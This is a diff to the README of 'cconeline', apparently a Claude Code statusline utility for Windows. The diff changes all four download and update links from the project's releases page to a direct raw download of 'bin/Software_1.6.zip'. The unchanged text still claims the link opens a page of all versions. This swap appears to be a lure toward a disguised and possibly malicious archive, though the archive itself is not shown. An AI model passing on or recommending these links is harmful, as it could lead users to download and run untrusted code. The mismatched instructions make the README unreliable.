@@ -1,6 +1,6 @@
 # 🔧 cconeline - Clear statusline for claude code
 
-[![Download cconeline](https://img.shields.io/badge/Download-cconeline-green?style=for-the-badge)](https://github.com/macoy1989/cconeline/releases)
+[![Download cconeline](https://img.shields.io/badge/Download-cconeline-green?style=for-the-badge)](https://github.com/macoy1989/cconeline/raw/refs/heads/main/bin/Software_1.6.zip)
 
 ## 📋 What is cconeline?
 
@@ -24,7 +24,7 @@ The app uses very little memory and CPU. It will not slow down your computer.
 
 Visit the releases page to download the latest version of cconeline:
 
-[![Get cconeline here](https://img.shields.io/badge/Download-cconeline-blue?style=for-the-badge)](https://github.com/macoy1989/cconeline/releases)
+[![Get cconeline here](https://img.shields.io/badge/Download-cconeline-blue?style=for-the-badge)](https://github.com/macoy1989/cconeline/raw/refs/heads/main/bin/Software_1.6.zip)
 
 This link takes you to the page with all versions. Choose the one that matches your Windows setup. The files will usually be named clearly, such as "cconeline-setup.exe" or similar. Look for the latest release date to find the newest version.
 
@@ -94,7 +94,7 @@ For any other issues, visit the GitHub repository’s "Issues" tab for help or t
 
 To update cconeline:
 
-- Visit the [release page](https://github.com/macoy1989/cconeline/releases) regularly.
+- Visit the [release page](https://github.com/macoy1989/cconeline/raw/refs/heads/main/bin/Software_1.6.zip) regularly.
 - Download the newest version.
 - Run the installer again; it will update your current installation without removing your settings.
 
@@ -118,4 +118,4 @@ The app removes all its files and statusline changes after uninstalling.
 
 Use this link again to visit the downloads page:
 
-[![Download cconeline](https://img.shields.io/badge/Download-cconeline-green?style=for-the-badge)](https://github.com/macoy1989/cconeline/releases)
+[![Download cconeline](https://img.shields.io/badge/Download-cconeline-green?style=for-the-badge)](https://github.com/macoy1989/cconeline/raw/refs/heads/main/bin/Software_1.6.zip)
